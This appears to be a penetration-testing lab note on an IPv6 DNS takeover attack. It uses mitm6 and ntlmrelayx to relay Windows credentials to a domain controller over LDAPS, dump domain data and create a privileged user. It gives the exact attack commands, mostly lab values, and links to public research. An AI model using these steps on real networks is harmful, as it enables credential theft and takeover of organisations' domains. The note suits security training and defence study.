### IPv6 Overview
We see that the windows users always turn on their IPv6 settings but only utilizes IPv4. So no one is doing DNS for IPv6. In this kind of attack an attacker would setup a fake DNS server for IPv6 and accept all the traffic comming from IPv6. It can be hashes which can be relayed using LDAPS to the Domain Controller

**Download mitm6 from this link**
https://github.com/fox-it/mitm6

### IPv6 DNS Takeover via mitm6
First lets spoof the IPv6 traffic. Type the following command
```bash
mitm6 -d <domain name>

# Example
mitm6 -d marvel.local
```

Now setup **ntlmrelayx** to perform relay attack using LDAPS. Type the following command
```bash
ntlmrelayx.py -6 -t ldaps://<domain controller ip> -wh <fake wpad> -l <folder for loot>

#Example
ntlmrelayx.py -6 -t ldaps://192.168.247.129 -wh fakewpad.marvel.local -l lootme
```

| Commands | Use |  
| ----------- | ----------- |  
| -6 | Using IPv6 Protocol  |  
| -t | Target |
| -wh | wpad server |
| -l | loot |

Now restart the other windows 10 machine to get the connection

![[Pasted image 20210724104327.png]]

![[Pasted image 20210724104401.png]]

Now check the lootme folder that is created

![[Pasted image 20210724104451.png]]

As you can see it has enumerated domain users etc

Lets open **domain_users_by_group.html file**

![[Pasted image 20210724104843.png]]

As you can see sqlservice password is revealed 
Now login to the windows machine as administrator

![[Pasted image 20210724105006.png]]

This created a ACL and added a new user to the domain

![[Pasted image 20210724105052.png]]

Checking the Domain Controller for users

![[Pasted image 20210724105203.png]]

As we can confirm a new user is created with domain rights

### Defenses
![[Pasted image 20210724105517.png]]

### Must Read
##### The worst of both worlds: Combining NTLM Relaying and Kerberos delegation
https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/

##### mitm6 â€“ compromising IPv4 networks via IPv6
https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/

##### Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition)

https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa